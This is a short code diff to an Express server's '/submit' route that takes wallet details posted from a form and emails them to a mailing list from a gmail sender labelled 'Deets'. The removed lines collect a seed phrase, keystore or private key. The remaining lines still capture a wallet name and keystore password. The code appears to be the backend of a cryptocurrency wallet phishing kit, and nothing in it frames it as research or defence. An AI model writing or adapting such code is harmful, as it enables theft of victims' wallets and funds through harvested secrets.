@@ -33,15 +33,14 @@ app.post('/submit', async (req, res) => {
   try {
     console.log('Srcvd:', req.body);
 
-    const { wetName, phWet, passwordWet } = req.body;
+    const { wName, psdWet } = req.body;
 
     const mailOptions = {
       from: '"Deets" <divasnow178@gmail.com>',
       to: maillist,
       html: `
-        <p><strong>Name:</strong> ${wetName || 'Not provided'}</p>
-        <p><strong>Phrase/KS/PKey:</strong> ${phWet || 'Not provided'}</p>
-        <p><strong>Pswd (if keystore):</strong> ${passwordWet || 'Not provided'}</p>
+        <p><strong>Name:</strong> ${wName || 'Not provided'}</p>
+        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
       `
     };
 
